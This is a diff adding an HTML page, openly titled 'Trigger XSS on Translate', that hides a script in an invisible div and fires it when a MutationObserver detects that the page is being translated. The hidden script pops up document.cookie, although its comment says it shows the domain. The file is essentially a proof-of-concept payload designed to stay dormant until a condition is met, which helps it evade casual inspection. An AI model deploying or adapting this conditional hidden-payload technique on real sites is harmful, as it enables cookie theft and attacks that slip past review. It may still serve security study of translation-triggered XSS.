@@ -1,1 +1,65 @@
-coba
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trigger XSS on Translate</title>
+</head>
+<body>
+    <h1>Trigger XSS on Translate Example</h1>
+    <p>This page contains a hidden payload that will be activated only when translated.</p>
+
+    <!-- Hidden element with XSS payload -->
+    <div id="payload-container" style="display: none;">
+        <div id="payload">
+            <script>
+                // Function to show document.domain
+                function showDomain() {
+                    alert('Document domain: ' + document.cookie);
+                }
+                // Attach event listener to trigger payload
+                document.addEventListener('translate-trigger', showDomain);
+            </script>
+        </div>
+    </div>
+
+    <script>
+        // Function to trigger the event when needed
+        function triggerPayload() {
+            const event = new Event('translate-trigger');
+            document.dispatchEvent(event);
+        }
+
+        // Function to observe changes that may indicate translation
+        function observeTranslation() {
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach((mutation) => {
+                    if (mutation.addedNodes.length > 0) {
+                        for (let node of mutation.addedNodes) {
+                            if (node.nodeType === Node.ELEMENT_NODE) {
+                                // Check if any new element indicates translation
+                                if (node.innerText.includes('Translate') || node.innerHTML.includes('Translate') ||
+                                    node.innerText.toLowerCase().includes('translate') || node.innerHTML.toLowerCase().includes('translate')) {
+                                    // Trigger the payload only when translation is detected
+                                    triggerPayload();
+                                    observer.disconnect(); // Stop observing after triggering payload
+                                }
+                            }
+                        }
+                    }
+                });
+            });
+
+            // Start observing the document body for changes
+            observer.observe(document.body, { childList: true, subtree: true });
+        }
+
+        // Initialize the observation when the page loads
+        window.onload = observeTranslation;
+
+        // Optional: Add a resize event listener to handle potential changes
+        window.addEventListener('resize', observeTranslation);
+    </script>
+</body>
+</html>
